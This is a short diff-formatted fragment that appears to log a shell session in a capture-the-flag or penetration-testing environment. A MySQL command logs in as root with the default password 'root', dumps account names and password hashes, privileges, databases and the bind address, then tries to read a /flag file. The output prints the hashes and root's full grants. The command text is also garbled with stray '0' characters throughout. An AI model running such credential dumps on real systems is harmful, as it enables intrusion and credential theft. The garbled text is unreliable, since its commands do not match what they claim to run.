@@ -1,0 +1,21 @@
+0mysq0l -uroot -proot0 -Nse "sele0ct user,ho0st,plugin,0authentic0ation_stri0ng from my0sql.user; 0show grant0s for 'roo0t'@'localho0st'; show 0databases;0 show vari0ables lik0e 'bind_ad0dress';" 02>&1; 
+e0cho '=== 0flag ===0'; ls -l /f0lag 2>/d0ev/null; 0cat /fla0g 2>/dev0/null; ec0ho CMDDO0NE_57a6f0997925240c649b914086522e2108f7
+0mariadb.sys	localhost	mysql_native_password	
+root	localhost	mysql_native_password	*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
+mysql	localhost	mysql_native_password	invalid
+	localhost		
+0	67e0c3b3e731		
+check	%	mysql_native_password	*8F9BE4F4B55516BE0BCC9D880F8C601A4BBE9441
+check	localhost	mysql_native_password	*8F9BE4F4B55516BE0BCC9D880F8C601A4BBE9441
+root	%	mysql_native_password	*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
+0GRANT ALL PRIVILEGES ON *.* TO `root`@`localhost` IDENTIFIED VIA mysql_native_password USING '*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B' OR unix_socket WITH GRANT OPTION
+GRANT PROXY ON ''@'%' TO 'root'@'localhost' WITH GRANT OPTION
+0information_schema
+mysql
+performance_schema
+sys
+test
+0bind_address	0.0.0.0
+0=== flag ===
+0CMDDONE_57a6f99792524c649b91486522e218f7
+
